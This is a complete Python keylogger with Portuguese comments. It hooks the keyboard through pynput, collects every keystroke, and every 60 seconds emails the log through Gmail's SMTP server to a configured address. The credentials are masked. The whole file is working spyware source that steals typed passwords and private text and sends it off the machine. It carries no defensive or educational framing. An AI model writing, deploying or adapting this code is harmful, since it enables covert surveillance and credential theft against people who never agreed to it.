from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# CONFIGURAÇOES DE EMAIL
EMAIL_ORIGEM = "xxxxxxxxxxxxxxxxxxxx"
EMAIL_DESTINO = "xxxxxxxxxxxxxxxxx"
SENHA_EMAIL = 'xxxxxxxxxxxxxxxxxxxxxx'

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados Capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
        
        log = ""
    
    # Agendar um envio a cada 60 segundos
    Timer(60, enviar_email).start()
    
def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            pass # Ignorar control, shift, etc...
        
# Inicia o keylogger e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()
    
    